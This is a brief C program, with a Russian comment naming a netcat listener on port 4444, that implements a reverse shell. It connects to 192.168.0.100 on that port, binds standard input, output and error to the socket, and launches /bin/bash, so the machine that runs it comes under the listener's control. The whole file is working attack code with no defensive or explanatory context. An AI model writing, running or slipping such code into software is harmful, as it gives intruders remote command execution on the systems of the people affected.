//клиент: nc -nvlp 4444

#include <netinet/in.h> 
#include <stdlib.h> 
#include <stdio.h> 
#include <string.h> 
#include <sys/socket.h> 
#include <sys/types.h> 
#include <arpa/inet.h> 
#include <unistd.h> 

#define PORT 4444
#define ADDR "192.168.0.100"

int main(void) 
{ 
    int sockfd; 
    struct sockaddr_in revsockaddr; 
 
    sockfd = socket(AF_INET, SOCK_STREAM, 0); 
    
    if (sockfd == -1) { 
        printf("socket creation failed...\n"); 
        return -1; 
    }  

    memset(&revsockaddr, 0, sizeof(revsockaddr));
    revsockaddr.sin_family = AF_INET; 
    revsockaddr.sin_port = htons(PORT); 
    revsockaddr.sin_addr.s_addr = inet_addr(ADDR); 

    if (connect(sockfd, (struct sockaddr*)&revsockaddr, sizeof(revsockaddr)) != 0) { 
        printf("connection with the server failed...\n"); 
        return -1; 
    }

    dup2(sockfd, 0); 
    dup2(sockfd, 1); 
    dup2(sockfd, 2);

    char *const argv[] = {"/bin/bash", NULL};
    execve(argv[0], argv, NULL); 

    return 0;
} 
